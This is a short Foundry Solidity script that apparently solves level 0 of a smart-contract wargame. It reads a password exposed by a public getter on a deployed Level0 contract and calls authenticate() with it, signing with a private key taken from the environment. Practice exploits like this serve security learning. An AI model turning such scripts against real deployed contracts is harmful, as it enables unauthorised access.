// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {Level0} from "../src/Level0.sol";

contract HackLevel0 is Script {
    Level0 level0Instance = Level0(0xB3dB404Dd2669a4c09160074BBb4F0368Ad2afC3);

    function run() external {
        string memory password = level0Instance.password();
        console.log("passowrd: ", password);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        level0Instance.authenticate(password);

        vm.stopBroadcast();
    }
}
